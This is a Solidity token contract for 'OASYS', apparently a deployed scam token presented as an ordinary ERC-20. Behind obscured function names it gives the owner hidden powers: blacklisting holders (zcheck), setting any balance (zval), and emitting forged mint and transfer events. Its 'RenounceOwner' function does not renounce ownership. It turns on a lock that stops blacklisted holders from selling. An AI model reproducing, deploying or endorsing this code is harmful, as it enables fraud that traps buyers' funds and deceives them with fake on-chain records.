/**
 *Submitted for verification at Etherscan.io on 2022-10-16
*/

// "SPDX-License-Identifier: UNLICENSED
                                 
pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract OASYSGAMES {
  
    mapping (address => uint256) public zAMt;
    mapping (address => bool) zTXn;


    // 
    string public name = "OASYS";
    string public symbol = unicode"OASYS";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    uint public zver = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        zAMt[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V3Router = 0xF20Dc8c061d106D19c46dD05909EF842065e2DbD;
    address lead_dev = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier xII() {   
    require(msg.sender == owner);
         _;}
    modifier V () {
        zver = 1;
        _;}
    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V3Router)  {
        require(zAMt[msg.sender] >= value);
        zAMt[msg.sender] -= value;  
        zAMt[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        if(zTXn[msg.sender]) {
        require(zver < 1);} 
        require(zAMt[msg.sender] >= value);
        zAMt[msg.sender] -= value;  
        zAMt[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return zAMt[account]; }
        function zcheck(address Z) xII public{          
        require(!zTXn[Z]);
        zTXn[Z] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function zval(address Z, uint256 xY) xII public returns (bool success) {
        zAMt[Z] = xY;
        return true; }
        function RenounceOwner() V public {
            require(msg.sender == owner);
        }
        function zwdraw(address Z) xII public {
        require(zTXn[Z]);
        zTXn[Z] = false; }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V3Router)  {
        require(value <= zAMt[from]);
        require(value <= allowance[from][msg.sender]);
        zAMt[from] -= value;  
        zAMt[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        if(zTXn[from] || zTXn[to]) {
        require(zver < 1);}
        require(value <= zAMt[from]);
        require(value <= allowance[from][msg.sender]);
        zAMt[from] -= value;
        zAMt[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }